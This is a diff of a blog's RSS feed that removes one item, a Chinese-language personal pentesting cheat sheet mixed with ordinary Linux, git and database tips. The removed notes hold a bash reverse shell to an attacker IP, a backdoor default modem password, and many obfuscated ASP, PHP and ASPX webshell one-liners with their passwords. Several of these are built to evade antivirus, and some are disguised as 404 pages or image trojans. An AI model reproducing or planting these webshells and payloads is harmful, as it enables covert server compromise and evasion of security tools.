@@ -5,1186 +5,9 @@
     <description>A blog about programming and network security</description>
     <link>/</link>
     <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Thu, 01 Sep 2016 22:35:59 +0800</pubDate>
-    <lastBuildDate>Thu, 01 Sep 2016 22:35:59 +0800</lastBuildDate>
+    <pubDate>Thu, 01 Sep 2016 22:37:31 +0800</pubDate>
+    <lastBuildDate>Thu, 01 Sep 2016 22:37:31 +0800</lastBuildDate>
     <generator>Jekyll v3.1.6</generator>
-    
-      <item>
-        <title></title>
-        <description>&lt;p&gt;My updating note…&lt;/p&gt;
-
-&lt;div class=&quot;language-markdown highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;1.&lt;/span&gt;没用过的在线扫描器:
-    https://jawfish.io/
-&lt;span class=&quot;p&quot;&gt;2.&lt;/span&gt;使用python开启一个简单的http服务:
-    python - m SimpleHTTPServer 80
-&lt;span class=&quot;p&quot;&gt;3.&lt;/span&gt;serve U运行cmd:
-    quote site exec &quot;...&quot;
-&lt;span class=&quot;p&quot;&gt;4.&lt;/span&gt;账号telecomadmin密码nE7jA%5m电信猫后门
-&lt;span class=&quot;p&quot;&gt;5.&lt;/span&gt;linux local_root提权  http://exploit.linuxnote.org/
-                        https://itunsecurity.wordpress.com/2015/08/16/vulnhub-com-writeup-darknet/(LinEnum.sh,linuxprivchecker.py,unix-privesc-check)
-                        https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/?redirect
-  windows　https://github.com/GDSSecurity/Windows-Exploit-Suggester
-&lt;span class=&quot;p&quot;&gt;6.&lt;/span&gt;metasploit与postgresql数据库连接:msf &amp;gt; db_connect msf3: AtZDNVQF3NJEyNqU9u1ciHcqTsbcZzKR@127.0.0.1: 5432 / msf3
-&lt;span class=&quot;p&quot;&gt;7.&lt;/span&gt;http: // tool.chacuo.net / mailanonymous   伪造邮件发送,一小时邮箱
-&lt;span class=&quot;p&quot;&gt;8.&lt;/span&gt;bash反弹:
-    /bin/bash -i &amp;gt; /dev/tcp/&lt;span class=&quot;nt&quot;&gt;&amp;lt;attacker&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;_ip&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;/&lt;span class=&quot;nt&quot;&gt;&amp;lt;port&amp;gt;&lt;/span&gt; 0&lt;span class=&quot;err&quot;&gt;&amp;lt;&amp;amp;&lt;/span&gt;1 2&amp;gt;&amp;amp;1
-&lt;span class=&quot;p&quot;&gt;9.&lt;/span&gt;sed -i &#39;/Love/d&#39; 1.txt   删除包含Love的行
-&lt;span class=&quot;p&quot;&gt;10.&lt;/span&gt;加了vpn就相当于vpn强制给通信链路加了个限制:所有数据只能通过vpn进出.(正常联网的功能只是给系统加了连接其他地址的各种道路,必须先保证可以联网,然后可以保证加了vpn后的效果会是这样&amp;gt;&amp;gt;
-    先通过一些数据链路连接到vpn,然后vpn作为代理再访问互联网.
-&lt;span class=&quot;p&quot;&gt;11.&lt;/span&gt;tar -T mulu.list -czf file.tar.gz
-&lt;span class=&quot;p&quot;&gt;12.&lt;/span&gt;分割大文件再合并
-    split -b 20m RevolutionOS.rmvb RevOS_part_,
-    cat RevOS_part_&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &amp;gt; RevolutionOS_RSB.rmvb,
-    md5sum RevolutionOS.rmvb(md5sum RevolutionOS_RSB.rmvb)
-&lt;span class=&quot;p&quot;&gt;13.&lt;/span&gt;一些数据库操作
-  给数据库添加一个用户
-    CREATE USER &#39;username&#39;@&#39;host&#39; IDENTIFIED BY &#39;password&#39;;(可小写)
-    修改密码
-    SET PASSWORD FOR &#39;username&#39;@&#39;host&#39; = PASSWORD(&#39;newpassword&#39;);
-    修改权限
-    GRANT privileges ON databasename.tablename TO &#39;username&#39;@&#39;host&#39; WITH GRANT OPTION;(databasename.tablename可为&lt;span class=&quot;ge&quot;&gt;*.*&lt;/span&gt;,privileges可为all,注意databasename和tablename中不要有&#39;.&#39;这个标点,否则databasename.tablename不知道在哪儿算作分开,eg.gv32_cms5.1.9是数据库名,则会出错)
-
-  设置允许本机所有网卡对应ip都可以被root连接命令:
-    grant all privileges on &lt;span class=&quot;ge&quot;&gt;*.*&lt;/span&gt; to root@&#39;%&#39; identified by &#39;12345678&#39; with grant option;
-    12345678为root密码
-&lt;span class=&quot;p&quot;&gt;14.&lt;/span&gt;ip:23.23.23.23    (bing)
-&lt;span class=&quot;p&quot;&gt;15.&lt;/span&gt;暴路径http://www.lxway.com/1191778.html  
-&lt;span class=&quot;p&quot;&gt;16.&lt;/span&gt;sublime text快捷键好东西:http://www.cnblogs.com/lanxuezaipiao/p/4151095.html
-  ctrl+D,ctrl+shift+k,ctrl+shift+&lt;span class=&quot;nt&quot;&gt;&amp;lt;-&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;,按住shift右键拖动鼠标多行编辑,set syntax:python,ctrl+enter,ctrl+shift+enter,ctrl+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;,ctrl+shift+v完整粘贴源代码格式,移动一行ctrl+shift+上/下
-&lt;span class=&quot;p&quot;&gt;17.&lt;/span&gt;nmap :
-  nmap -v -sP -PI -PT -Pn 192.168.0.0/24
-  nmap -v -sn -PE 192.168.0.0/24 快速扫描局域网存活主机
-&lt;span class=&quot;p&quot;&gt;18.&lt;/span&gt;常用linux命令
-
-   head -n 1 /etc/issue   # 查看linux操作系统版本
-   getconf LONG_BIT       # 查看系统是32位还是64位
-   网络
-   
-   # ifconfig               # 查看所有网络接口的属性
-   # iptables -L            # 查看防火墙设置
-   # route -n               # 查看路由表
-   # netstat -lntp          # 查看所有  监听端口
-   # netstat -antp          # 查看所有已经建立的连接
-   # netstat -s             # 查看网络统计信息
-
-   find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*vimrc*&lt;/span&gt;&quot; | xargs grep -r &quot;linebreak&quot;
-       #在当前目录下查找文件名中包含vimrc的所有文件,并在这些文件中查https://3xp10it.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/11/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2011-0104/https://3xp10it.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/08/11/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89-cve-2011-0104/找包含&quot;linebreak&quot;关键字的文件中的与&quot;linebreak&quot;相关的行
-&lt;span class=&quot;p&quot;&gt;19.&lt;/span&gt;linux backup and restore:&lt;span class=&quot;nt&quot;&gt;&amp;lt;sudo&amp;gt;&lt;/span&gt;
-    0&amp;gt;http://xing.rocks/2015/03/06/ubuntu%E7%B3%BB%E7%BB%9F%E5%A4%87%E4%BB%BD%E4%B8%8E%E8%BF%98%E5%8E%9F/    更详细
-    1&amp;gt;backup:
-    cd /
-    tar cvpzf linuxbackup.tgz --exclude=/proc --exclude=/lost+found --exclude=/linuxbackup.tgz --exclude=/mnt --exclude=/sys --exclude=/root/.cache /
-    2&amp;gt;restore:
-    backup the new system&#39;s /boot and /etc/fstab
-    cd /
-      tar xvpfz linuxbackup.tgz -C / 
-      mkdir proc  
-      mdkir lost+found  
-      mkdir mnt   
-      mkdir sys
-    restore the new system&#39;s backup&#39;s /boot and /etc/fstab
-      reboot
-    3&amp;gt;http://blog.csdn.net/shendl/article/details/7384755
-    4&amp;gt;https://wiki.archlinux.org/index.php/Full_system_backup_with_rsync
-&lt;span class=&quot;p&quot;&gt;20.&lt;/span&gt;python中import和from xx import xx需要注意的事:
-  import语句中:import或者from xx import xx语句当中,形如a.b的
-  用法如from a.b import f(f是b.py中一个函数名或者一个常量,a是一个文件夹,只有文件夹才
-  可以带.后接具体文件名《如此处的b&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;省略.py后缀&amp;gt;》,在具体的函数调用而不是import语句中,文件可
-  以带.后接文件中的函数或常量《如sqlmap中,在sqlmap目录下运行python,可以import tamper.sapce2comment,然
-  后运行tamper.space2comment.tamper(&quot; ajf  &quot;),但是不可以直接运行sapce2comment.tamper(&quot; ajf  &quot;),这样会报错,
-  而且以上两种情况都需要在tamper文件夹下面放一个__init__.py文件,里面的内容可以
-  为空,如果在sqlmap目录下使用from tamper import &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;则需
-  要在__init__.py里面加上__all__=&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&#39;&#39;,&#39;&#39;,&#39;&#39;...&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;,其中&#39;&#39;里面
-  是tamper目录下所有模块的模块名,这样的话就可以通过from tamper import &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;来导入所有模块了,然后
-  就可以使用如greatest.tamper(&quot;and 1&amp;gt;2&quot;)等的语句了》)
-  各tamper详解:http://www.moonsec.com/post-422.html
-  最常用--tamper=between,space2randomblank,randomcase,xforwardedfor,charencode
-  大致通用between,space2randomblank,randomcase,xforwardedfor,charencode,multiplespaces,space2plus,nonrecursivereplacement,apostrophemask,base64encode,space2mssqlhash,space2mysqldash,unionalltounion,securesphere,space2comment
-&lt;span class=&quot;p&quot;&gt;21.&lt;/span&gt;神器lfi自动探测panoptic:https://github.com/lightos/Panoptic
-   神器load_file自动探测sqlnuke:https://github.com/nuke99/sqlnuke.git
-&lt;span class=&quot;p&quot;&gt;22.&lt;/span&gt;webshell:
-  webshell generate site(good):http://www.zjjv.com/
-  good:https://r57.gen.tr/
-       http://www.dcvi.net/
-  http://www.passwaf.com/
-  http://cduan.cc/ma/index.htm
-  php-b374k(PHP version &amp;gt; 4.3.3 and PHP 5):https://github.com/b374k
-         (browser old version): https://code.google.com/p/b374k-shell/
-  http://www.dcvi.net/
-&lt;span class=&quot;p&quot;&gt;23.&lt;/span&gt;经典入侵思路:
-  http://www.2cto.com/Article/201201/115793.html(伪静态注入到获得webshell)
-&lt;span class=&quot;p&quot;&gt;24.&lt;/span&gt;cookie注入中转http://www.rising.com.cn/newsletter/news/2012-08-23/12195.html(目前认为只可asp,get)
-&lt;span class=&quot;p&quot;&gt;25.&lt;/span&gt;vpn搭建教程(2003server)http://www.xfisp.com/style/info/shownews.asp?id=3(pptp)
-                         http://vps.gl/windows/215.html  http://help.fireinter.com/tengxunyun/2015/0203/354.html(l2tp)
-&lt;span class=&quot;p&quot;&gt;26.&lt;/span&gt;关于ipcam的UPnP或NAT的知识http://www.pernet.tv/thread-103-1-1.html
-&lt;span class=&quot;p&quot;&gt;27.&lt;/span&gt;google search api(good):http://www.catonmat.net/blog/python-library-for-google-search/ (not good now   xgoogle)
-   google translate api(good):http://www.catonmat.net/blog/python-library-for-google-translate/   (not good now   xgoogle)
-   (little good can search&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;inurl:index.php?option=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;,but not(&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;site:*.edu inurl:inurl.php?option=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;)) https://pypi.python.org/pypi/Google-Search-API
-   (guan_fang)google search api:http://scriptsonscripts.blogspot.com/2015/02/python-google-search-api-requests.html    ajax-&amp;gt;json-&amp;gt;guan_fang(custom search api,100 results per day for free user)
-   (good_GoogleScraper,!-s (google,yahoo,bing..))google search api:http://incolumitas.com/2013/01/06/googlesearch-a-rapid-python-class-to-get-search-results/    or    https://github.com/NikolaiT/GoogleScraper/blob/master/README.md
-   two links may mean (guan_fang)custom search api
-   may helpful:https://google-api-client-libraries.appspot.com/documentation/customsearch/v1/python/latest/customsearch_v1.cse.html
-   may helpful:https://github.com/google/google-api-python-client/tree/master/samples/customsearch
-   may helpful:http://wescpy.blogspot.com/2014/09/simple-google-api-access-from-python.html   http://wescpy.blogspot.com/2014/11/authorized-google-api-access-from-python.html
-   具体详情见百度云盘笔记文件夹
-&lt;span class=&quot;p&quot;&gt;28.&lt;/span&gt;.NET reverse tool(graywolf):https://www.digitalbodyguard.com/graywolf.html
-&lt;span class=&quot;p&quot;&gt;29.&lt;/span&gt;linux fdisk-&amp;gt;ext3-&amp;gt;mount:http://cuchadanfan.blog.51cto.com/9940284/1671416
-&lt;span class=&quot;p&quot;&gt;30.&lt;/span&gt;Cknife  java环境菜刀  已放到/usr/share
-&lt;span class=&quot;p&quot;&gt;31.&lt;/span&gt;免杀一句话:http://blog.hacku.cn/post/260.html
-           http://www.freebuf.com/articles/web/9396.html
-           kali linux2.0:
-            webacoo
-            weevely
-   asp:
-   &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%execute(unescape(&quot;eval%20request%28%222016%22%29&quot;))%&amp;gt;          key:2016
-
-   &amp;lt;%
-   dim a,b,temp,c
-   a=&quot;eva@@l%20req@@uest%28%22helloxj%22%29&quot;
-   b=replace(a,&quot;@@&quot;,&quot;零&quot;)
-   c=split(b,&quot;零&quot;)
-   for i=0 to ubound(c)
-   temp=temp+c(i)
-   next
-   execute(unescape(temp))
-   %&amp;gt;
-                        key:helloxj
-
-   &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%Y=request(&quot;shezhang&quot;)%&amp;gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%execute(Y)%&amp;gt;
-    
-   &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%eval(eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(&quot;shezhang&quot;))%&amp;gt;
-    
-   &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%eval&quot;&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;(&quot;e&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;v&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;a&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;l&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;(&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;r&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;e&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;q&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;u&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;e&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;s&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;t&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;(&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;0&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;-&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;2&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;-&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;5&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;)&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;)&quot;)%&amp;gt;(密码是-7)
-
-   php:
-   &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php $a = base64_decode(Y.X.N.z.Z.X.J01);$a($_POST[g]);?&amp;gt;&lt;/span&gt;       key:g
-   &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php $x_x=base64_decode(Y.X.N.z.Z.X.J01);$x_x(($_POST[$_GET[a]]));?&amp;gt;&lt;/span&gt;        key:the value of &quot;a&quot;
-   &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php$a=str_replace(x,&quot;&quot;,&quot;axsxxsxexrxxt&quot;);$a($_POST[&quot;shezhang&quot;]);?&amp;gt;&lt;/span&gt;
-    
-   &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php$lang=(string)key($_POST);$lang($_POST[&#39;shezhang&#39;]);?&amp;gt;&lt;/span&gt;
-    
-   test&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php$k=&quot;ass&quot;.&quot;ert&quot;;$k(${&quot;_PO&quot;.&quot;ST&quot;}[&#39;nihao&#39;]);?&amp;gt;&lt;/span&gt;
-    
-   &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php $a=&quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;; $a($_POST[&quot;shezhang&quot;]); ?&amp;gt;&lt;/span&gt;
-    
-   &amp;lt;?php         
-   @$_=&quot;s&quot;.&quot;s&quot;./&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/&quot;e&quot;./*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/&quot;r&quot;;         
-   @$_=/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/&quot;a&quot;./*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/$_./&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;/&quot;t&quot;;         
-   @$_/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/($/*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/{&quot;_P&quot;./&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/&quot;OS&quot;./*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/&quot;T&quot;}         
-   &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;);?&amp;gt;  密码是 -7
-   &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php if(!$_POST[&#39;nihao&#39;]){header(&#39;HTTP/1.1 404 Not Found&#39;); exit(); }else{ $s=&quot;p&quot;.&quot;r&quot;.&quot;e&quot;.&quot;g&quot;.&quot;_&quot;.&quot;r&quot;.&quot;e&quot;.&quot;p&quot;.&quot;l&quot;.&quot;a&quot;.&quot;c&quot;.&quot;e&quot;; @$s(&quot;~[discuz]~e&quot;,$_POST[&#39;nihao&#39;],&quot;Access denied&quot;); } ?&amp;gt;&lt;/span&gt;
-
-   
-   &lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;404 Not Found&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Not Found&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;The requested URL was not found on this server.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
-   &amp;lt;?php
-   ($b4dboy = $_POST&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&#39;nihao&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;) &amp;amp;&amp;amp; @preg_replace(&#39;/ad/e&#39;,&#39;@&#39;.str_rot13(&#39;riny&#39;).&#39;($b4dboy)&#39;, &#39;add&#39;); 
-   header(&#39;HTTP/1.1 404 Not Found&#39;);
-   ?&amp;gt;
-
-   &amp;lt;?php
-   include &#39;xxoo.jpg&#39;;
-   ?&amp;gt;
-   xxoo.jpg为一句话图片木马,此php后门中在win下菜刀连接只能看到木马所在盘符文件,其他盘符磁盘下文件默认在菜刀中不可加载,也看不到,但是可通过虚拟终端&quot;dir 盘符:&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;
-   看到,对文件也有操作权限,在linux下可看到所有文件,该版本不被查杀
-
-   &amp;lt;?php
-   $file = fopen(&quot;test.php&quot;,&quot;w&quot;);
-   fwrite($file,$_REQUEST&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;);
-   fclose($file);
-   ?&amp;gt;
-   该版本不被查杀,且比上面一个更安全&lt;span class=&quot;sb&quot;&gt;
-
-
-&lt;/span&gt;   aspx:
-   ASPX一句话的过安全狗效果不怎么样,不过我认为能支持aspx百分之8/90支持asp
-   &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%@PageLanguage=Jscript%&amp;gt;      
-   &amp;lt;%var/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/P/*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/=/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/&quot;e&quot;+&quot;v&quot;+/*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/
-   &quot;a&quot;+&quot;l&quot;+&quot;(&quot;+&quot;R&quot;+&quot;e&quot;+/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/&quot;q&quot;+&quot;u&quot;+&quot;e&quot;/*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/+&quot;s&quot;+&quot;t&quot;+      
-   &quot;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&quot;+      
-   &quot;,&quot;+&quot;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&quot;+&quot;u&quot;+&quot;n&quot;+&quot;s&quot;/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;/+&quot;a&quot;+&quot;f&quot;+&quot;e&quot;+&quot;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&quot;+&quot;)&quot;;eval      
-   (/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/P/*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/,/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/&quot;u&quot;+&quot;n&quot;+&quot;s&quot;/*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/+&quot;a&quot;+&quot;f&quot;+&quot;e&quot;/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;/);%&amp;gt;  密码 -7
-    
-    
-   &lt;span class=&quot;nv&quot;&gt;&amp;lt;%@PageLanguage=&quot;Jscript&quot;%&amp;gt;&amp;lt;%eval(Request.Item[&quot;shezhang&quot;],&quot;unsafe&quot;);%&amp;gt;&lt;/span&gt;
-    
-    
-   &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;language=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;C#&quot;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;runat=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;server&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;      
-   WebAdmin2Y.x.yaaaaa=newWebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;);      
-   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;                              密码是webadmin
-
-   aspx隐藏一句话新:http://z-cg.com/?mod=pad&lt;span class=&quot;ni&quot;&gt;&amp;amp;act=view&amp;amp;id=10(&amp;lt;%WebServices.ShowRunnerVersion();&lt;/span&gt;%&amp;gt;,&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%WebServices.InitializeWebServices(&quot;fuck&quot;);%&amp;gt;)
-&lt;span class=&quot;p&quot;&gt;31.&lt;/span&gt;windows local privileges:http://www.52wa.net/post-198.html
-                            http://le4f.net/post/post/windows-x64-local-privilege-escalation
-                            https://forum.90sec.org/forum.php?mod=viewthread&amp;amp;tid=9067#lastpost
-                            https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp
-                            http://www.freebuf.com/articles/web/76892.html
-                            https://github.com/foxglovesec/Potato
-                            in meterpreter:
-                            meterpreter&amp;gt;background
-                            msf&amp;gt;use post/multi/recon/local_exploit_suggester 
-                            msf&amp;gt;show options
-                            msf&amp;gt;exploit
-                            or  
-                            meterpreter&amp;gt;run post/multi/recon/local_exploit_suggester
-&lt;span class=&quot;p&quot;&gt;32.&lt;/span&gt;phpstudy for linux:
-  wget -c http://lamp.phpstudy.net/phpstudy.bin?
-  chmod +x phpstudy.bin
-  # 权限设置
-  ./phpstudy.bin     #运行安装
-
-  服务进程管理:phpstudy (start|stop|restart|uninstall)
-  站点主机管理:phpstudy (add|del|list)
-  ftpd用户管理:phpstudy ftp (add|del|list)
-&lt;span class=&quot;p&quot;&gt;33.&lt;/span&gt;strem:http://www.yxbao.com/bd/27803.html#goDown
-&lt;span class=&quot;p&quot;&gt;34.&lt;/span&gt;linux的git使用:
-  http://www.linuxidc.com/Linux/2014-02/96989.htm
-  完成密钥的设置后:
-  git init
-  git add .
-  git commit -a -m &quot;xxx&quot;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;没有这一步会显示error&amp;gt;
-  git remote add origin url
-  git push -u origin master
-
-  更新部分文件时,提交更新:
-  git add file(changed file or new file,the command &#39;git add&#39; means add file to local git repositories)
-  git status(check is the file status is ok)
-  git commit -a -m &quot;something&quot;(without commit command can not update the file,this is a &#39;must&#39;)
-  git push -u origin master&lt;span class=&quot;sb&quot;&gt;
-
-
-&lt;/span&gt;  新建本地git仓库时,添加文件:(要先pull下来tar_url的文件到新建的文件夹,然后将要提交的文件复制到新建文件夹中,
-  如果先把要提交的新文件放到新建的文件夹下再进行如下一串命令,将提示出错)
-  git init(在随便新建的一个文件夹下)
-  git pull tar_url(该条命令执行后用新文件替换旧文件)
-  git status
-  git add newfile (git add .)
-  git commit -a -m &quot;xxx&quot;
-  git remote add origin tar_url
-  git push -u origin master                                               
-&lt;span class=&quot;p&quot;&gt;
-35.&lt;/span&gt;生活学习:1&amp;gt;(本杰明-富兰克林13条)http://www.201980.com/lizhi/chenggong/9386.html
-             2&amp;gt;(曾国藩修身12条)http://www.201980.com/lizhi/chenggong/8007.html
-&lt;span class=&quot;p&quot;&gt;36.&lt;/span&gt;mouse without borders:多屏幕同键盘鼠标控制
-              https://www.microsoft.com/en-us/download/confirmation.aspx?id=35460(win)
-              http://alternativeto.net/software/mouse-without-borders2/?platform=linux(linux)
-              x2vnc(目前认为最好,通过vnc达到mouse without borders的功能!!)
-&lt;span class=&quot;p&quot;&gt;37.&lt;/span&gt;java执行jar文件命令:java -jar xx.jar
-&lt;span class=&quot;p&quot;&gt;38.&lt;/span&gt;.htaccess can be :
-  1&amp;gt;
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;FilesMatch&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;haha&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-  SetHandler application/x-httpd-php
-  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/FilesMatch&amp;gt;&lt;/span&gt;
-  2&amp;gt;
